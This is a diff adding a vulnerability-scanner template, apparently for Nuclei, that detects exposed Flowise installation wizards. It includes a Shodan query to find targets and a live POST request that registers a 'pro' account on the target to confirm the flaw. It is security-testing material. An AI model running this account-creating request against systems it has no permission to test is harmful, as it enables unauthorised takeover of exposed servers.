@@ -1,0 +1,45 @@
+flow: http(1) && http(2)
+http:
+- matchers:
+  - condition: and
+    dsl:
+    - contains(body, "Flowise - Build AI Agents, Visually")
+    - status_code == 200
+    internal: true
+    type: dsl
+  method: GET
+  path:
+  - '{{BaseURL}}/organization-setup'
+- matchers:
+  - condition: and
+    dsl:
+    - contains_all(body,"{{name}}","{{email}}","organization")
+    - status_code == 201
+    type: dsl
+  raw:
+  - 'POST /api/v1/account/register HTTP/1.1
+
+    Host: {{Hostname}}
+
+
+    {"user":{"name":"{{name}}","email":"{{email}}","type":"pro","credential":"{{password}}"}}
+
+    '
+id: flowise-installer
+info:
+  author: pussycat0x
+  description: 'Flowise Installation Wizard is susceptible to the Installation page
+    exposure due to misconfiguration
+
+    '
+  metadata:
+    runzero-review: REJECT/2025-11-17/excluding tag intrusive
+    shodan-query: http.title:"Flowise - Build AI Agents, Visually"
+    verified: true
+  name: Flowise Installation Wizard - Exposure
+  severity: high
+  tags: misconfig,exposure,install,flowise,intrusive,vuln,ai
+variables:
+  email: '{{randstr}}@{{rand_base(5)}}.com'
+  name: '{{to_lower(rand_text_alpha(5))}}'
+  password: '{{rand_text_alphanumeric(12)}}'
